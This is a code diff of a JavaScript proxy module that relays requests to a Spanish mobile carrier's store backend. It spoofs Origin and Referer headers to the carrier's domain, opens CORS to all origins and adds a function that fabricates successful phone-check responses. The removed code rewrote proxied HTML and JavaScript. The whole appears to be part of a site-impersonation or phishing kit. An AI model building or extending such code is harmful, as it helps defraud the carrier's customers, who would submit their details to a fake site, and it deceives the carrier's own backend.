@@ -6,15 +6,31 @@ function isApiRequest(url) {
   return url.pathname.startsWith('/api/');
 }
 
-async function modifyApiRequest(request, url) {
+function simulatePhoneCheckResponse(phone) {
+  const id = Math.floor(Math.random() * 90000000) + 10000000;
+  const phoneNumber = phone && phone.replace ? phone.replace(/[^\d]/g, '') : '';
+  const finalPhoneNumber = phoneNumber.match(/^\d{9}$/) ? phoneNumber : '';
+  
+  return {
+    code: 200,
+    data: {
+      id: id.toString(),
+      charges: 0,
+      country: "spania",
+      number: finalPhoneNumber
+    }
+  };
+}
+
+async function modifyApiRequest(request, url, sourceDomain) {
   const headers = {};
   for (const [key, value] of Object.entries(request.headers)) {
     if (!['host', 'origin', 'referer', 'x-forwarded-host', 'x-forwarded-proto'].includes(key.toLowerCase())) {
       headers[key] = value;
     }
   }
-  headers['Origin'] = `https://${SOURCE_DOMAIN}`;
-  headers['Referer'] = `https://${SOURCE_DOMAIN}/`;
+  headers['Origin'] = `https://${sourceDomain}`;
+  headers['Referer'] = `https://${sourceDomain}/`;
 
   let bodyContent = null;
   if (['POST', 'PUT', 'PATCH'].includes(request.httpMethod)) {
@@ -33,7 +49,7 @@ async function modifyApiRequest(request, url) {
   }
 
   try {
-    const response = await fetch(`https://${SOURCE_DOMAIN}${url.pathname}${url.search || ''}`, {
+    const response = await fetch(`https://${sourceDomain}${url.pathname}${url.search || ''}`, {
       method: request.httpMethod,
       headers: headers,
       body: bodyContent,
@@ -75,125 +91,58 @@ async function followRedirects(response, headers, maxRedirects = 5) {
   return currentResponse;
 }
 
-async function handleProxyRequest(request) {
-  const url = new URL(request.rawUrl || `https://${request.headers.host}${request.path}`);
+async function handleStoreBackend(request, url) {
+  const newPath = url.pathname.replace(/^\/store-backend/, '');
+  const backendUrl = `https://store-backend.digimobil.es${newPath}${url.search}`;
   
-  console.log('Handling proxy request:', { url: url.pathname, method: request.httpMethod });
-
-  if (request.httpMethod === 'OPTIONS') {
-    return {
-      statusCode: 200,
-      headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-        'Access-Control-Allow-Headers': '*',
-        'Access-Control-Max-Age': '86400'
-      },
-      body: ''
-    };
-  }
-
-  if (isApiRequest(url)) {
-    const response = await modifyApiRequest(request, url);
-    
-    let finalResponse = response;
-    if (response.status >= 300 && response.status < 400) {
-      const headers = {};
-      for (const [key, value] of Object.entries(request.headers)) {
-        if (!['host', 'origin', 'referer'].includes(key.toLowerCase())) {
-          headers[key] = value;
-        }
-      }
-      finalResponse = await followRedirects(response, headers);
-    }
-    
-    const responseHeaders = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-      'Access-Control-Allow-Headers': '*'
-    };
-    
-    // Додаємо заголовки з відповіді
-    for (const [key, value] of Object.entries(finalResponse.headers.raw())) {
-      if (!['access-control-allow-origin', 'access-control-allow-methods', 'access-control-allow-headers'].includes(key.toLowerCase())) {
-        responseHeaders[key] = value[0];
-      }
-    }
-    
-    const bodyBuffer = await finalResponse.buffer();
-    
-    console.log('API response:', { status: finalResponse.status, url: url.pathname });
-    
-    return {
-      statusCode: finalResponse.status,
-      headers: responseHeaders,
-      body: bodyBuffer.toString('base64'),
-      isBase64Encoded: true
-    };
-  }
-
-  // Для звичайних запитів до сайту
   const headers = {};
   for (const [key, value] of Object.entries(request.headers)) {
-    if (!['host', 'origin', 'referer'].includes(key.toLowerCase())) {
+    if (!['host', 'origin', 'referer', 'x-forwarded-host', 'x-forwarded-proto'].includes(key.toLowerCase())) {
       headers[key] = value;
     }
   }
+  
+  headers['Origin'] = 'https://store-backend.digimobil.es';
+  headers['Referer'] = 'https://store-backend.digimobil.es/';
 
   let bodyContent = null;
   if (['POST', 'PUT', 'PATCH'].includes(request.httpMethod)) {
+    const contentType = request.headers['content-type'] || '';
     try {
       bodyContent = request.body;
     } catch (e) {
-      console.error('Error getting request body:', e);
+      console.error('Error processing store-backend request body:', e);
     }
   }
 
-  const proxyRequest = {
+  const backendRequest = {
     method: request.httpMethod,
     headers: headers,
     body: bodyContent,
     redirect: 'manual'
   };
 
-  let response = await fetch(`https://${SOURCE_DOMAIN}${url.pathname}${url.search || ''}`, proxyRequest);
-  if (response.status >= 300 && response.status < 400) {
-    response = await followRedirects(response, headers);
-  }
+  try {
+    const backendResponse = await fetch(backendUrl, backendRequest);
+    const newHeaders = new Headers(backendResponse.headers);
+    newHeaders.set('Access-Control-Allow-Origin', '*');
+    newHeaders.set('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    newHeaders.set('Access-Control-Allow-Headers', '*');
 
-  const contentType = response.headers.get('Content-Type') || '';
-  console.log('Proxy response:', { status: response.status, contentType, url: url.pathname });
-
-  if (contentType.includes('text/html')) {
-    return await modifyHTML(response);
+    return new Response(backendResponse.body, {
+      status: backendResponse.status,
+      headers: newHeaders
+    });
+  } catch (error) {
+    console.error('Error in handleStoreBackend:', error);
+    throw error;
   }
-  
-  if (contentType.includes('javascript')) {
-    return await modifyJavaScript(response);
-  }
-
-  const responseHeaders = {};
-  for (const [key, value] of Object.entries(response.headers.raw())) {
-    responseHeaders[key] = value[0];
-  }
-  
-  responseHeaders['Access-Control-Allow-Origin'] = '*';
-  responseHeaders['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS';
-  responseHeaders['Access-Control-Allow-Headers'] = '*';
-  
-  const bodyBuffer = await response.buffer();
-  
-  return {
-    statusCode: response.status,
-    headers: responseHeaders,
-    body: bodyBuffer.toString('base64'),
-    isBase64Encoded: true
-  };
 }
 
 module.exports = {
   isApiRequest,
+  simulatePhoneCheckResponse,
   modifyApiRequest,
   followRedirects,
-  handleProxyRequest
+  handleStoreBackend
 };
